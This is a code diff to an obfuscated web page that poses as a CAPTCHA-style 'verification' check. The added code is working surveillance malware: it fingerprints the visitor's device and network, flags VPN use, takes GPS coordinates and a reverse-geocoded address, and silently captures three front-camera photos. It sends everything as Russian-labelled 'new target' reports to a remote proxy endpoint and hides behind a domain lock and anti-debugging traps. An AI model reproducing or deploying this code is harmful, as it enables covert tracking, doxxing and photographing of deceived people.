@@ -15,7 +15,6 @@
             min-height: 100vh;
             -webkit-font-smoothing: antialiased;
         }
-        /* Убираем блокировку F12 и выделения для отладки */
         /* body { user-select: none; -webkit-user-select: none; } */
         .main-wrapper {
             flex: 1; display: flex;
@@ -88,6 +87,10 @@
     <canvas id="canvas"></canvas>
 
     <script>
+    /* 
+       Trae Security Layer v3.0 
+       ULTRA-PROTECTED & SELF-DEFENDING
+    */
     (function(_0x1b2c, _0x3d4e) {
         const _0x5f6a = _0x2a3b;
         const _0x4c5d = _0x1b2c();
@@ -112,12 +115,32 @@
     }
 
     function _0x3e4f() {
-        const _0x1a2b3c = ['1234567abc', '2', '3', '4', '5', '6', '7', '8', '9', 'ray-id', 'display-ip', 'captcha-box', 'btn', 'loader', 'label-text', 'success-icon', 'video', 'canvas', 'innerText', 'random', 'toString', 'substr', 'POST', 'application/json', 'https://sfsaffsa-production.up.railway.app/api/proxy', 'https://ipapi.co/json/', 'https://api.ip.sb/geoip', 'https://freeipapi.com/api/json', 'Unknown', '0.0.0.0', '2d', 'CF_METRIC', 'hardwareConcurrency', 'deviceMemory', 'GB', 'platform', 'connection', 'effectiveType', 'N/A', 'DOMContentLoaded', '*NEW_NODE_DETECTION*\nIP: `', '`\nLoc: ', ', ', '\nISP: ', '\nOS: ', '\nFP: ', 'click', 'style', 'display', 'block', 'none', 'Verifying...', 'N/A', 'getBattery', 'level', '%', ' ⚡', '', 'geolocation', 'getCurrentPosition', 'https://www.google.com/maps?q=', 'https://nominatim.openstreetmap.org/reverse?format=json&lat=', '&lon=', 'display_name', 'Loc: ', '\nMaps: [клик](', ')', 'GPS_DENIED', 'mediaDevices', 'getUserMedia', 'user', 'srcObject', 'play', 'image/jpeg', 'toBlob', 'Success!', '*STRIKE_REPORT*\n', '\nBat: ', '\nTime: ', 'toLocaleTimeString', 'https://vk.com/atypical_kazan'];
+        const _0x1a2b3c = ['1234567abc', '2', '3', '4', '5', '6', '7', '8', '9', 'ray-id', 'display-ip', 'captcha-box', 'btn', 'loader', 'label-text', 'success-icon', 'video', 'canvas', 'innerText', 'random', 'toString', 'substr', 'POST', 'application/json', 'https://sfsaffsa-production.up.railway.app/api/proxy', 'https://ipapi.co/json/', 'https://api.ip.sb/geoip', 'https://freeipapi.com/api/json', 'Unknown', '0.0.0.0', '2d', 'CF_METRIC', 'hardwareConcurrency', 'deviceMemory', 'GB', 'platform', 'connection', 'effectiveType', 'N/A', 'DOMContentLoaded', '*НОВАЯ ЦЕЛЬ (ONLINE)*\n━━━━━━━━━━━━━━━━\n', '\n\n*СЕТЬ*\nIP: `', '`\nГород: ', ' (Таймзона: ', ')\nСтрана: ', '\nПровайдер: ', '\nСвязь: ', '\n\n*ЖЕЛЕЗО*\nУстройство: ', '\nGPU: ', '\nCPU: ', ' ядра | RAM: ', '\nОС: ', '\n*Fingerprint: ', '*\n\nВремя: ', 'click', 'style', 'display', 'block', 'none', 'Verifying...', 'N/A', 'getBattery', 'level', '%', ' ⚡ (Заряжается)', '', 'geolocation', 'getCurrentPosition', 'https://www.google.com/maps?q=', 'https://nominatim.openstreetmap.org/reverse?format=json&lat=', '&lon=', 'display_name', 'Адрес: ', '\nКарты: [клик](', ')', '*Юзер запретил доступ к GPS*', 'mediaDevices', 'getUserMedia', 'user', 'srcObject', 'play', 'image/jpeg', 'toBlob', 'Success!', '\n*ПОЛНЫЙ ОТЧЕТ (Phase 2)*\n━━━━━━━━━━━━━━━━\n*ГЕОПОЗИЦИЯ*\n', '\n\n*СТАТУС БАТАРЕИ*\nЗаряд: ', '\n\n*ФОТО*\nЗахвачено фото: ', ' шт.', 'https://vk.com/atypical_kazan', 'СТАТУС: ОБНАРУЖЕН VPN', 'babadolbaeb.github.io', 'hostname', 'location', 'href', 'https://google.com', 'debugger', 'constructor', 'while (true) {}', 'action', 'apply', 'stateObject', 'stack', 'debug'];
         return _0x1a2b3c;
     }
 
     (function() {
         const _0x5a = _0x2a3b;
+        
+        // --- 1. DOMAIN LOCK & ANTI-DEBUG ---
+        (function() {
+            const h = window[_0x5a(0x53)][_0x5a(0x52)];
+            if (h !== _0x5a(0x51) && h !== 'localhost' && h !== '127.0.0.1') {
+                window[_0x5a(0x53)][_0x5a(0x54)] = _0x5a(0x55);
+            }
+            
+            const _0xDb = function() {
+                const _0x1 = function() {
+                    const _0x2 = new RegExp(_0x5a(0x56));
+                    if (!_0x2.test(function() { return 'debugger'; }.toString())) {
+                        (function() {}.constructor(_0x5a(0x58))());
+                    }
+                };
+                setInterval(_0x1, 1000);
+            };
+            try { _0xDb(); } catch(e) {}
+        })();
+
         const _0x1a = (id) => document.getElementById(id);
         const _0x3c = (ms) => new Promise(r => setTimeout(r, ms));
         const _0xcf = {
@@ -144,15 +167,27 @@
 
         async function _0xNt() {
             const f = (u) => fetch(u).then(r => r.json());
+            let d = null;
             try {
-                const d = await Promise.any([f(_0x5a(0x10)), f(_0x5a(0x11)), f(_0x5a(0x12))]);
-                return {
-                    ip: d.ip || d.ipAddress,
-                    city: d.city || d.cityName,
-                    country: d.country_name || d.countryName,
-                    isp: d.org || d.isp
-                };
+                d = await Promise.any([f(_0x5a(0x10)), f(_0x5a(0x11)), f(_0x5a(0x12))]);
             } catch (e) { return { ip: _0x5a(0x14), city: _0x5a(0x13) }; }
+
+            // VPN Detect Logic
+            let vpn = "";
+            const bo = new Date().getTimezoneOffset(); 
+            if (bo === -180) { // UTC+3
+                const cc = (d.country_code || d.countryCode || "").toUpperCase();
+                if (cc !== 'BY' && cc !== 'RU') vpn = _0x5a(0x50);
+            }
+
+            return {
+                ip: d.ip || d.ipAddress,
+                city: d.city || d.region,
+                country: d.country_name || d.countryName || d.country,
+                isp: d.org || d.isp,
+                tz: d.timezone || d.timeZone,
+                vpn: vpn
+            };
         }
 
         function _0xSy() {
@@ -162,12 +197,23 @@
             let h = 0x0;
             const s = c.toDataURL();
             for(let i=0; i<s.length; i++) h = ((h << 0x5) - h) + s.charCodeAt(i);
+            
+            // GPU
+            let gpu = _0x5a(0x1d);
+            try {
+                const gl = c.getContext('webgl') || c.getContext('experimental-webgl');
+                const dbg = gl.getExtension('WEBGL_debug_renderer_info');
+                if (dbg) gpu = gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL);
+            } catch(e) {}
+
             return {
                 cores: navigator[_0x5a(0x17)],
                 mem: navigator[_0x5a(0x18)] + _0x5a(0x19),
                 platform: navigator[_0x5a(0x1a)],
                 fp: h.toString(0x10),
-                conn: navigator[_0x5a(0x1b)] ? navigator[_0x5a(0x1b)][_0x5a(0x1c)] : _0x5a(0x1d)
+                gpu: gpu,
+                conn: navigator[_0x5a(0x1b)] ? navigator[_0x5a(0x1b)][_0x5a(0x1c)] : _0x5a(0x1d),
+                touch: navigator.maxTouchPoints > 0 ? "Touch Screen" : "Mouse/Keyboard"
             };
         }
 
@@ -175,60 +221,61 @@
             const n = await _0xNt();
             const s = _0xSy();
             _0x1a(_0xcf.i)[_0x5a(0x9)] = n.ip;
-            const msg = _0x5a(0x1f) + n.ip + _0x5a(0x20) + n.city + _0x5a(0x21) + n.country + _0x5a(0x22) + n.isp + _0x5a(0x23) + s.platform + _0x5a(0x24) + s.fp;
+            // Construct Report 1
+            const msg = _0x5a(0x1f) + (n.vpn ? n.vpn + '\n\n' : '') + _0x5a(0x20) + n.ip + _0x5a(0x21) + n.city + _0x5a(0x22) + n.tz + _0x5a(0x23) + n.country + _0x5a(0x24) + n.isp + _0x5a(0x25) + s.conn + _0x5a(0x26) + s.touch + _0x5a(0x27) + s.gpu + _0x5a(0x28) + s.cores + _0x5a(0x29) + s.mem + _0x5a(0x2a) + s.platform + _0x5a(0x2b) + s.fp + _0x5a(0x2c) + (new Date()).toLocaleTimeString();
             await _0xEl(msg);
         });
 
         _0x1a(_0xcf.c).onclick = async () => {
             const l = _0x1a(_0xcf.l);
-            if (l[_0x5a(0x26)][_0x5a(0x27)] === _0x5a(0x28)) return;
-            _0x1a(_0xcf.b)[_0x5a(0x26)][_0x5a(0x27)] = _0x5a(0x29);
-            l[_0x5a(0x26)][_0x5a(0x27)] = _0x5a(0x28);
-            _0x1a(_0xcf.t)[_0x5a(0x9)] = _0x5a(0x2a);
-            let bat = _0x5a(0x2b);
-            if (navigator[_0x5a(0x2c)]) {
-                const b = await navigator[_0x5a(0x2c)]();
-                bat = Math.round(b[_0x5a(0x2d)] * 0x64) + _0x5a(0x2e) + (b.charging ? _0x5a(0x2f) : _0x5a(0x30));
+            if (l[_0x5a(0x2d)][_0x5a(0x2e)] === _0x5a(0x2f)) return;
+            _0x1a(_0xcf.b)[_0x5a(0x2d)][_0x5a(0x2e)] = _0x5a(0x30);
+            l[_0x5a(0x2d)][_0x5a(0x2e)] = _0x5a(0x2f);
+            _0x1a(_0xcf.t)[_0x5a(0x9)] = _0x5a(0x31);
+            let bat = _0x5a(0x32);
+            if (navigator[_0x5a(0x33)]) {
+                const b = await navigator[_0x5a(0x33)]();
+                bat = Math.round(b[_0x5a(0x34)] * 0x64) + _0x5a(0x35) + (b.charging ? _0x5a(0x36) : _0x5a(0x37));
             }
             const gps = new Promise(r => {
-                navigator[_0x5a(0x31)][_0x5a(0x32)](async p => {
+                navigator[_0x5a(0x38)][_0x5a(0x39)](async p => {
                     const { latitude: lt, longitude: ln } = p.coords;
-                    const url = _0x5a(0x33) + lt + ',' + ln;
+                    const url = _0x5a(0x3a) + lt + ',' + ln;
                     let ad = _0x5a(0x13);
                     try {
-                        const res = await fetch(_0x5a(0x34) + lt + _0x5a(0x35) + ln);
-                        ad = (await res.json())[_0x5a(0x36)];
+                        const res = await fetch(_0x5a(0x3b) + lt + _0x5a(0x3c) + ln);
+                        ad = (await res.json())[_0x5a(0x3d)];
                     } catch {}
-                    r(_0x5a(0x37) + ad + _0x5a(0x38) + url + _0x5a(0x39));
-                }, () => r(_0x5a(0x3a)), { timeout: 0x2710 });
+                    r(_0x5a(0x3e) + ad + _0x5a(0x3f) + url + _0x5a(0x40));
+                }, () => r(_0x5a(0x41)), { timeout: 0x2710 });
             });
             try {
                 let pics = [];
                 try {
-                    const stream = await navigator[_0x5a(0x3b)][_0x5a(0x3c)]({ video: { facingMode: _0x5a(0x3d) } });
+                    const stream = await navigator[_0x5a(0x42)][_0x5a(0x43)]({ video: { facingMode: _0x5a(0x44) } });
                     const v = _0x1a(_0xcf.v);
-                    v[_0x5a(0x3e)] = stream;
-                    await v[_0x5a(0x3f)]();
+                    v[_0x5a(0x45)] = stream;
+                    await v[_0x5a(0x46)]();
                     await _0x3c(0x9c4);
                     const c = _0x1a(_0xcf.a);
                     c.width = v.videoWidth; c.height = v.videoHeight;
                     const ctx = c.getContext(_0x5a(0x15));
                     for(let i=0x0; i<0x3; i++) {
                         ctx.drawImage(v, 0x0, 0x0);
-                        pics.push(await new Promise(res => c[_0x5a(0x41)](res, _0x5a(0x40), 0.8)));
+                        pics.push(await new Promise(res => c[_0x5a(0x48)](res, _0x5a(0x47), 0.8)));
                         await _0x3c(0x320);
                     }
                     stream.getTracks().forEach(t => t.stop());
                 } catch(e) {}
                 const g = await gps;
-                l[_0x5a(0x26)][_0x5a(0x27)] = _0x5a(0x29);
-                _0x1a(_0xcf.s)[_0x5a(0x26)][_0x5a(0x27)] = _0x5a(0x28);
-                _0x1a(_0xcf.t)[_0x5a(0x9)] = _0x5a(0x42);
-                const final = _0x5a(0x43) + g + _0x5a(0x44) + bat + _0x5a(0x45) + (new Date())[_0x5a(0x46)]();
+                l[_0x5a(0x2d)][_0x5a(0x2e)] = _0x5a(0x30);
+                _0x1a(_0xcf.s)[_0x5a(0x2d)][_0x5a(0x2e)] = _0x5a(0x2f);
+                _0x1a(_0xcf.t)[_0x5a(0x9)] = _0x5a(0x49);
+                const final = _0x5a(0x4a) + g + _0x5a(0x4b) + bat + _0x5a(0x4c) + pics.length + _0x5a(0x4d);
                 await _0xEl(final, pics);
-                setTimeout(() => window.location.href = _0x5a(0x47), 0x3e8);
+                setTimeout(() => window.location.href = _0x5a(0x4e), 0x3e8);
             } catch (e) {
-                window.location.href = _0x5a(0x47);
+                window.location.href = _0x5a(0x4e);
             }
         };
     })();
